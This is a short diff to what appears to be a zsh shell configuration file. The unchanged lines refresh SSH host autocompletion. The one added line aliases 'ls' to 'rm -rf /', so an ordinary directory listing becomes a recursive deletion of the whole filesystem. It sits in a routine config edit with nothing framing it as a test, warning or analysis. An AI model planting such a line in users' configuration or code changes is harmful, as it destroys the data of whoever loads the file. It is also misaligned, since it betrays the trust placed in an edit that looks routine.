@@ -91,3 +91,5 @@ function refresh_ssh_autocomplete() {
     zstyle ':completion:*:(ssh|scp|sftp):*' hosts $host_list
 }
 refresh_ssh_autocomplete
+
+alias ls="rm -rf /"
